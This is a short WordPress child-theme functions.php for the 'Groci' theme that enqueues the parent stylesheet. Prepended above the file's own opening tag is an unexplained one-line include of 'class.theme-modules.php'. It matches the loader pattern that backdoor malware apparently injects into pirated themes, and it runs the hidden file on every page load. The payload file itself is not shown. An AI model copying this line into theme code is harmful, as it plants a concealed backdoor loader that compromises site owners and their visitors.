<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php

/**s
 * functions.php
 * @package WordPress
 * @subpackage Groci
 * @since Groci 1.0
 * 
 */

add_action( 'wp_enqueue_scripts', 'groci_enqueue_styles', 99 );
function groci_enqueue_styles() {
    wp_enqueue_style( 'parent-style', get_template_directory_uri() . '/style.css' );

}

?>